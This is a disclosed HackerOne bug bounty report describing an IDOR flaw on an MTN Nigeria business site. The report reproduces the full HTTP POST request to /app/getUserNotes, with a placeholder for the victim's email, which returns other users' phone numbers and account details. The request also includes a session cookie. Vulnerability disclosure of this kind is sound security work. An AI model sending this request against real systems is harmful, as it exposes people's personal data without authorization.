# IDOR at mtnmobad.mtnbusiness.com.ng leads to PII leakage. 

## Report Details
- **Report ID**: 1773609
- **URL**: https://hackerone.com/reports/1773609
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-11-14T21:08:00.883Z
- **Disclosed**: 2024-10-05T10:28:36.209Z

## Reporter
- **Username**: hazemhussien99
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
Hello team, i found an IDOR at `https://mtnmobad.mtnbusiness.com.ng/` that allows an attacker to enumerate data such as personal phone number and and account information justt from knowing the email.

The vulnerable request is the following:
```
POST /app/getUserNotes HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 195
Origin: https://mtnmobad.mtnbusiness.com.ng
Connection: close
Referer: https://mtnmobad.mtnbusiness.com.ng/
Cookie: G_ENABLED_IDPS=google; connect.sid=s%3ATYGgZ8wqgEinB9zX0d7-OdZyt2jXa_ev.hQw0FOvTD5bB159jCtqA%2BXv7z%2FHROL%2B2vSS6mNK%2FqVg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"params":{"updates":[{"param":"user","value":{"userEmail":"<PUT_VICTIM_EMAIL_HERE>"},"op":"a"}],"cloneFrom":{"updates":null,"cloneFrom":null,"encoder":{},"map":null},"encoder":{},"map":null}}
```

Simply replace the place holder `<PUT_VICTIM_EMAIL_HERE>` with the victim's email and you can see private data about his account such as phone number and account information, as you can see that's PII information being leaked.

## Impact

PII leakage.

## Attachments
No attachments
